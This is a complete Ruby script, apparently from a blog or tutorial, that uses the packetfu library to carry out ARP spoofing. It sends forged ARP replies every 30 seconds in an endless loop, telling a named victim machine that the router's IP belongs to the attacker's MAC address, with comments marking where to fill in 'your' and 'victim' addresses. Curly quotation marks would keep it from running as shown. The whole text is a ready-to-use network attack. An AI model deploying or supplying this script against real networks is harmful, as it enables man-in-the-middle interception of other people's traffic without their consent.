#!/usr/bin/env ruby
# encoding: UTF-8

require “packetfu”

puts “Sending ARP Packet Spoof Every 30 Seconds…”
x = PacketFu::ARPPacket.new(:ﬂavor => “Linux”) # Flavor can be changed to Windows or hp_deskjet
  x.eth_saddr=”04:7d:7b:c5:98:cf” # Set your MAC Address
  x.eth_daddr=”00:0c:76:17:a4:17″ # Set victim MAC Address
  x.arp_saddr_mac=”04:7d:7b:c5:98:cf” # Set your MAC Address
  x.arp_daddr_mac=”00:0c:76:17:a4:17″ # Set victim MAC Address
  x.arp_saddr_ip=’192.168.1.254′ # Router IP Address
  x.arp_daddr_ip=”192.168.1.79″ # Victim IP Address
  x.arp_opcode=2 # ARP Reply Code 
  sunny=false # Condition Set
  while sunny==false do # Infinite Loop created
  x.to_w(‘wlan0′) # Put Packet to wire – Can change to eth0
    sleep(30) # “Sleep” interval in seconds, change for your preference
end
